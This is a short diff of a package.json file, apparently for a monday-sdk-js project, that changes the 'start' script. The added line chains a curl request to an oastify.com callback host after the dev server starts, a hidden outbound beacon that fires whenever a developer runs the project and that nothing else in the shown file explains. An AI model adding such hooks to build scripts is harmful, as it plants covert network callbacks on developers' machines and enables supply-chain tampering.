@@ -40,7 +40,7 @@
     "typescript": "^4.9.5"
   },
   "scripts": {
-    "start": "webpack-dev-server",
+    "start": "webpack-dev-server && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/monday-sdk-js",
     "build": "webpack --mode=production --env.WEBPACK_BUILD=true",
     "test": "mocha './src/**/*-test.js'",
     "test:watch": "mocha './src/**/*-test.js' --watch",
